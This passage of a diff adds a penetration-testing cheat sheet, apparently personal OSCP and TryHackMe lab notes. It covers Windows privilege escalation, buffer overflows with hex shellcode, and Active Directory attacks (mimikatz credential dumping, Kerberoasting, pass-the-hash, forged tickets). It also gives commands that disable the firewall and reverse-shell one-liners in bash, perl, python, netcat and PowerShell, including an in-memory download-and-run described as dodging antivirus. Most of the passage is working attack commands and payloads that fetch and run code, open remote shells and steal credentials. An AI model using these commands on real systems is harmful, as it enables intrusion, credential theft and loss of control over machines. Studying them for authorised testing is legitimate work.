+ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path &lt;HijackPath&gt;
+CanRestart     : True
+
+###
+MEmuSVC
+https://www.exploit-db.com/exploits/46437
+Restart victim machine by: shutdown /r
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
+
+[+] Interesting Services -non Microsoft-(T1007)
+
+unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
+</code></pre></div></div>
+
+<h5 id="exploitation-5">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; Common.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+cd "C:\Program Files\Unquoted Path Service\"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Common.exe', '.\Common.exe')
+sc start unquotedsvc
+</code></pre></div></div>
+
+<h4 id="hot-potato">Hot potato</h4>
+
+<h5 id="exploitation-6">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/nc.exe', '.\nc.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Tater.ps1.exe', '.\Tater.ps1.exe')
+powershell -exec bypass -command "&amp; { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe' }"
+</code></pre></div></div>
+
+<h4 id="hot-potato">Custom service</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#FreeSWITCH - 8021
+FreeSWITCH 1.10.1 - Command Execution
+https://www.exploit-db.com/exploits/47799
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.61.135 LPORT=4444 -f exe -o shell.exe
+nc -lnvp 4444
+python -m SimpleHTTPServer 9000
+python3 47799 &lt;IP> "powershell.exe Invoke-WebRequest -Uri http://10.11.61.135:9000/shell.exe -OutFile .\shell.exe && .\shell.exe"
+#OpenClinic GA 5.194.18 - Local Privilege Escalation
+https://www.exploit-db.com/exploits/50448
+  #Attacking Machine 
+  nc -lvnp 4445 
+  msfvenom -p windows/shell_reverse_tcp LHOST=&lt;Listen_IP> LPORT=&lt;LISTEN_PORT>> -f exe -o mysqld.exe 
+  python3 -m http.server 
+
+  #Victim Machine 
+  cd C:\projects\openclinic\mariadb\bin 
+  ren "mysqld.exe" "mysqld_bak.exe" 
+  curl http://&lt;LHOST>:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe" 
+  shutdown /r /t 1
+</code></pre></div></div>
+
+<h4 id="bypassuac">Bypass UAC</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In case you already have administrative priviledge BUT "whoami /groups" -> Mandatory Label\<strong>Medium</strong> Mandatory Level
+OR when run PowerUp.ps1 -> output: 
+  [+] User is in a local group that grants administrative privileges!
+  [+] Run a BypassUAC attack to elevate privileges to admin.
+Method1: Use fodhelper.exe
+  (kali)  cd ~/Workspace/THM/tools/WIN
+          python3 -m http.server 8000 
+          #transfer FodhelperBypass.ps1 to targer machine (https://github.com/winscripting/UAC-bypass)
+
+          sudo nc -lnvp 80
+
+  (windows)
+          #check if current shell is running as properly arch x64/x86
+            powershell.exe [Environment]::Is64BitProcess (output should be True)
+
+          powershell.exe -ep bypass
+          . .\FodhelperBypass.ps1
+          FodhelperBypass -program "c:\windows\temp\dane\nc.exe 192.168.119.227 80 -e cmd.exe"
+
+
+</code></pre></div></div>
+<h4 id="cve">CVE</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Already compiled exploit
+https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/abatchy17/WindowsExploits
+
+#CVE-2021-1675 (one of PrintNightmare)
+  When can use this:  
+    + Check patch level: if the lastest patch was installed on before June 2021, it seems vulnerable:
+    wmic qfe get Caption,Description,HotFixID,InstalledOn
+  Exploit:
+    cd ~/Workspace/THM/tools/WIN/CVEs (https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1)
+    -> transfer to target machine
+    (target) powershell.exe -ep bypass
+    Import-Module .\CVE-2021-1675.ps1
+    Invoke-Nightmare -NewUser john -NewPassword "password123!"
+    runas /noprofile /user:john cmd
+</code></pre></div></div>
+
+<h4 id="cve">Search tip</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows 7 &lt;PUT BUILD NUMBER HERE> privilege escalation
+  windows xp 5.1 2600 privilege escalation: https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+</code></pre></div></div>
+
+<h5 id="windows-xp">Windows XP</h5>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">CVE</th>
+      <th style="text-align: left">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">CVE-2002-1214</td>
+      <td style="text-align: left">ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2003-0352</td>
+      <td style="text-align: left">ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2003-0533</td>
+      <td style="text-align: left">MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2003-0719</td>
+      <td style="text-align: left">ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2003-0812</td>
+      <td style="text-align: left">ms03_049_netapi - exploits a stack buffer overflow in the NetApi32</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2003-0818</td>
+      <td style="text-align: left">ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2003-0822</td>
+      <td style="text-align: left">ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2004-0206</td>
+      <td style="text-align: left">ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2010-3138</td>
+      <td style="text-align: left">EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2010-3147</td>
+      <td style="text-align: left">EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2010-3970</td>
+      <td style="text-align: left">ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2011-1345</td>
+      <td style="text-align: left">Internet Explorer does not properly handle objects in memory - allows remote execution of code via object</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2011-5046</td>
+      <td style="text-align: left">EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2012-4349</td>
+      <td style="text-align: left">Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root</td>
+    </tr>
+  </tbody>
+</table>
+
+<h5 id="windows-7">Windows 7</h5>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">CVE</th>
+      <th style="text-align: left">Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">CVE-2010-0232</td>
+      <td style="text-align: left">ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2010-2568</td>
+      <td style="text-align: left">ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2010-2744</td>
+      <td style="text-align: left">EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2010-3227</td>
+      <td style="text-align: left">EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2014-4113</td>
+      <td style="text-align: left">ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2014-4114</td>
+      <td style="text-align: left">ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-0016</td>
+      <td style="text-align: left">ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer’s sandbox - code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2018-8494</td>
+      <td style="text-align: left">remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input</td>
+    </tr>
+  </tbody>
+</table>
+
+<h5 id="windows-8">Windows 8</h5>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">CVE</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">CVE-2013-0008</td>
+      <td>ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2013-1300</td>
+      <td>ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2013-3660</td>
+      <td>ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2013-3918</td>
+      <td>ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2013-7331</td>
+      <td>ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine’s filenames</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2014-6324</td>
+      <td>ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2014-6332</td>
+      <td>ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2014-6352</td>
+      <td>ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-0002</td>
+      <td>ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation</td>
+    </tr>
+  </tbody>
+</table>
+
+<h5 id="windows-10">Windows 10</h5>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">CVE</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">CVE-2015-0057</td>
+      <td>exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-1769</td>
+      <td>MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-2426</td>
+      <td>ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-2479</td>
+      <td>MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-2513</td>
+      <td>MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-2423</td>
+      <td>MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-2431</td>
+      <td>MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2015-2441</td>
+      <td>MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution</td>
+    </tr>
+  </tbody>
+</table>
+
+<h5 id="windows-server-2003">Windows Server 2003</h5>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">CVE</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">CVE-2008-4250</td>
+      <td>ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">CVE-2017-8487</td>
+      <td>allows an attacker to execute code when a victim opens a specially crafted file - remote code execution</td>
+    </tr>
+  </tbody>
+</table>
+<hr>
+
+<h2 id="bof">BUFFER OVERFLOW</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+- Find start address of the buffer      (1)
+- Find start address of return address  (2)
+- How much data to overflow = (2) - (1) 
+###Other way, using gdb
+gdb buffer-overflow
+(gdb) run $(python -c "print('A'*148)")
+#0x0000000041414141 in ?? ()
+###
+- python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address" | ./program
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+python -c "print('\x90' * 30 +'shell-in-hex-version'+'\x41' * (x-30-shell-6) + 'B'*6)" | ./program_name
+gdb buffer-overflow
+(gdb) run $(python -c "print('\x90' * 100 +'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41' * 10 + 'B'*6)")
+#little endian remind
+(gdb) x/100x $rsp-200
+#./buffer-overflow $(python...)
+</code></pre></div></div>
+<h3 id="bof-shell">Shellcodes</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    push $0x3b
+    pop %eax
+    xor %rdx,%rdx
+    movabs $0x68732f6e69622f2f,%r8  
+    shr $0x8, %r8                   
+    push %r8
+    mov %rsp, %rdi
+    push %rdx
+    push %rdi
+    mov %rsp, %rsi
+    syscall        <------ from the top to this point it's too execute /bin/sh
+    push $0x3c
+    pop %eax
+    xor %rdi,%rdi
+    syscall       <------ The last 4 lines are for the exit function.
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+#Hex version:
+\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+
+#Other shell:
+\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05
+#$pwn shellcraft -f d amd64.linux.setreuid 1002
+\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+#$pwn shellcraft -f d amd64.linux.setreuid
+\x6a\x6b\x58\x0f\x05\x48\x89\xc7\x6a\x71\x58\x48\x89\xfe\x0f\x05
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Open & Run the oscp.exe in Immunity Debugger
+Mona Configuration
+  <strong>!mona config -set workingfolder c:\mona\%p</strong>
+Fuzzing: 
+  + Change machine ip, prefix (program name) in fuzzer.py
+  + <strong>python3 fuzzer.py</strong>
+  (Note the largest number of bytes that made server crashed)
+Crash Replication & Controlling EIP:
+  + Change machine ip, prefix in exploit.py
+    offset = 0
+    retn = ""
+    padding = ""
+    payload = ""
+  + Generate a cyclic pattern with 400 bytes more than number in the previous step:
+  <strong>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;x+400&gt;</strong>
+  + exploit.py: payload = "&lt;output&gt;"
+  + Immunity Debugger: re-open & re-run oscp.exe
+  + <strong>python3 exploit.py</strong>
+  + <strong>!mona findmsp -distance &lt;x+400&gt;</strong>
+  + Log data: <strong>EIP contains normal pattern : ... (offset XXXX)</strong>
+  + exploit.py: offset = XXXX   payload = ""    retn = "BBBB"
+  + Restart oscp.exe & python3 exploit.py
+  + The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
+Finding Bad Characters
+  + Generate a bytearray, exclude the null byte (\x00) by default:
+  <strong>!mona bytearray -b "\x00"</strong>
+  + <strong>python3 genBadChars.py</strong>
+  + exploit.py: payload = "&lt;output&gt;"
+  + Restart oscp.exe & python3 exploit.py
+  + <strong>!mona compare -f C:\mona\oscp\bytearray.bin -a &lt;address-at-ESP&gt;</strong>
+  + Get bad chars
+  + <strong>!mona bytearray -b "\x00\xNEW\xBAD\xCHARS"</strong>
+  + exploit.py: payload = "&lt;exclude-\x00\xNEW\xBAD\xCHARS&gt;"
+  + Restart oscp.exe & python3 exploit.py
+  + <strong>!mona compare -f C:\mona\oscp\bytearray.bin -a &lt;address-at-ESP&gt;</strong>
+  Repeat until "Unmodified"
+Finding a Jump Point
+  + <strong>!mona jmp -r esp -cpb "\x00\xNEW\xBAD\xCHARS"</strong>
+  + Log data: Choose an address (from Found a total of x pointers)
+  + exploit.py: retn = "choosen address in backwards" (i.e: 0x148011a8 -> retn = "\xa8\x11\x80\x14")
+Generate Payload
+  + <strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.61.135 LPORT=4444 EXITFUNC=thread -b "\x00" -f c</strong>
+  + exploit.py: payload = (&lt;output&gt;)    padding = "\x90" * 16
+Exploit!
+  + <strong>nc -lnvp 4444</strong>
+  + Restart oscp.exe & python3 exploit.py
+</code></pre></div></div>
+<h3 id="bof-radare2">Radare2</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Radare2
+r2 -d ./crackme #start
+aaa #analyse
+V (enter) > p (disassembly mode) > p (debugging mode)
+# If you want to have more stack infomation:
+: (open radare command prompt) > e stack.size = 256 (256 bytes)
+# Hot key in debugging mode
+F7 #step into
+F8 #step over
+. #go back to current instruction 
+: > DSF (ds to end of frame)
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Radare2
+r2 -r profile.rr2 -d ./crackme #start with a terminal as output screen
+#profile.rr2
+#!/usr/bin/rarun2
+stdio=/dev/pts/3 #check by "tty" cmd in the output terminal
+#output terminal
+sleep 999999
+</code></pre></div></div>
+<hr>
+<h2 id="active-directory">ACTIVE DIRECTORY</h2>
+
+<h3 id="ad-process">Process</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* ####Confirm the current machine is part of the AD environment
+  systeminfo | findstr Domain
+* ####AD Enum
+  * ###Use powershell to enum users & groups:
+    (powershell)
+    Get-ADUser -Filter * (-SearchBase "[CN=Users,]OU=THM,DC=THMREDTEAM,DC=COM")
+    
+    (enum product version)
+    wmic product get name,version
+    (enum services)
+    netstat -noa |findstr "LISTENING" |findstr "3212"
+</code></pre></div></div>
+
+<h3 id="ad-process">Sample workflow</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Step1: Get Initial foothold (-> PrivEsc to Admin/System)
+
+Step2: Enum
+  - Computer in domain:
+    Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+    (for Linux machine: nmap -sP 10.200.107.*)
+    #Enumerate Live machines
+    Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+    
+    +Mapping host name with IP: nslookup [name]
+      Ex: APPSRV01 (ip.58); CLIENT01 (ip.59); DC01 (ip.57)
+
+  - User in domain: net user /domain
+  - User's properties: (PowerView.ps1) Get-DomainUser -Properties cn, DisplayName, MemberOf | Format-List
+
+Step3: Try retrieving cached passwords of other domain user
+  - View currently logged on user: (PowerView.ps1)
+    Get-NetLoggedon -ComputerName APPSRV01
+    (Get-NetSession -ComputerName dc01)
+  - Dump password's hash use mimikatz.exe (need local admin privilege)
+    sekurlsa::logonpasswords
+  - Crack password: (john) --format=NT
+
+  - Check groups of that user: (PowerView.ps1)
+    Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
+    (#The above may not work, use this:
+      + List domain group:
+        Get-DomainGroup | Select-Object distinguishedname
+      + List member of 'Remote Desktop Users' group:
+        Get-NetLocalGroupMember -GroupName 'Remote Desktop Users' | Select-Object MemberName, IsGroup, IsDomain
+    )
+  - If it's a member of Remote Desktop Users group: (or check if 3389 or other rdp service port open on target)
+    xfreerdp /u:Nathan /p:abc123// /v:192.168.179.59 /cert:ignore
+
+Step4: Enum through Service Principal Names (SPN)
+  - Get list user SPN's: (PowerView.ps1) Get-NetUser -SPN
+    #Find another domain user is in fact a service acocunt (check logoncount > 0)
+
+  - Kerberoast attack against this user to get hash then crack:
+    (PowerView.ps1) Invoke-Kerberoast
+  - Copy hash to hash.txt, then crack use hashcat:
+    hashcat -m 13100 -a 0 hash.txt ~/Workspace/THM/wordlists/rockyou.txt
+
+  - Check groups of that user:
+    If no RDP, use psexec: python psexec.py offsec.local/Allison:RockYou\!@192.168.179.59
+    (Get-Domain)
+
+Step5: Redo step3 to extract hash from memory
+  - Method1: (mimikatz.exe - need local admin privilege)
+    sekurlsa::logonpasswords
+
+  - Method2: (reg save)
+    reg save hklm\sam %tmp%/SAM
+    reg save hklm\system %tmp%/System
+
+    samdump2 system sam (run on kali)
+    (the above seems not work, use this: python3 /usr/share/creddump7/pwdump.py SYSTEM SAM)
+
+Step 6: Use the obtained hash
+  python psexec.py CLIENT01/Administrator@192.168.179.57 -hashes :8c802621d2e36fc074345dded890f3e5 
+
+  #psexec.py &lt;DOMAIN>/&lt;USER>:&lt;PASSWORD>@&lt;IP>
+  #psexec.py &lt;DOMAIN>/&lt;USER>@&lt;IP> -hashes :&lt;NTHASH>
+</code></pre></div></div>
+
+<h3 id="ad-process">Silver / Golden ticket attack</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>Silver ticket</strong>
+Privilege required: None | Kill chain: Privilege Escalation | Tool: mimikatz
+Use when attacker obtains the NTLM password hash of a Service Account (e.g. via Kerberoasting)
+-> create a forged TGS Ticket (silver ticket) using NTLM hash of Service Account
+-> use the ticket to access a specific service on a target host (able to forge the Privileged Account Certificate -PAC and other info as part of the Silver Ticket)
+
+#Exploitation: https://www.youtube.com/watch?v=GTJyd-AMfuM&list=PLPDUz8KkxR5z2z84CJ1JyLXC9JgxkjPBk&index=9 (other flow)
+  - Get list user SPN's: (PowerView.ps1) Get-NetUser -SPN
+    #Find another domain user is in fact a service acocunt (check logoncount > 0)
+
+  - Kerberoast attack against this user to get hash:
+    (PowerView.ps1) Invoke-Kerberoast
+    OR
+    (mimikatz) lsadump::lsa /inject /name:&lt;other domain admin account or a service account (i.e. SQLService account)>
+
+  - Create ticket using mimikatz:
+    kerberos::golden /user:Silver /domain:controller.local /sid: /rc4:<NTML hash> /id:1103
+    (sid get from "whoami /user": sid:x-x-x-x-x-x-x-y cut the -y #only get x)
+
+  - Use the Silver Ticket to access other machines:
+    (mimikatz) misc::cmd
+
+<strong>Golden ticket</strong>
+Privilege required: Administrator | Kill chain: Persistence | Tool: mimikatz
+
+#Exploitation: https://www.youtube.com/watch?v=f6SleGakcE0&list=PLPDUz8KkxR5z2z84CJ1JyLXC9JgxkjPBk&index=11 (other flow)
+  
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* ####Check for Security Solution:
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+  Get-Service WinDefend
+  Get-MpComputerStatus | select RealTimeProtectionEnabled
+
+  Get-NetFirewallProfile | Format-Table Name, Enabled
+  (admin privileges: disable one or more firewall profile):
+  Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+
+  (check firewall rules)
+  Get-NetFirewallRule | select DisplayName, Enabled, Description
+  Test-NetConnection -ComputerName 127.0.0.1 -Port 80
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exploitation: https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/#tools
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="proofs">PROOFS</h2>
+
+<h3 id="linux-5">Linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2&gt;/dev/null; cat /Desktop/proof.txt 2&gt;/dev/null;echo " "
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#For labs
+find /home -name *user*.txt*
+ls /root
+</code></pre></div></div>
+
+<h3 id="windows-5">Windows</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo. &amp; echo. &amp; echo whoami: &amp; whoami 2&gt; nul &amp; echo %username% 2&gt; nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp;  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="reverse-shell">REVERSE SHELL</h2>
+
+<h3 id="amazing-tool-for-shell-generation">Amazing tool for shell generation</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download
+git clone https://github.com/ShutdownRepo/shellerator
+
+# Install requirements
+pip3 install --user -r requirements.txt
+
+# Executable from anywhere
+sudo cp shellrator.py /bin/shellrator
+</code></pre></div></div>
+
+<h3 id="bash-1">Bash</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
+</code></pre></div></div>
+
+<h3 id="perl-1">Perl</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="&lt;IP&gt;";$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<h3 id="python-1">Python</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP&gt;",&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.11.61.135",4444));os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+</code></pre></div></div>
+
+<h3 id="netcat-1">Netcat</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f
+</code></pre></div></div>
+
+<h3 id="powershell">Powershell</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).downloadString('http://my.ip.goes.here/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+it would run the powershell reverse shell in memory (as writing the script to the disk would make the AV kill it)
+</code></pre></div></div>
+
+<h3 id="more-reverse-shell">More reverse shell</h3>
+
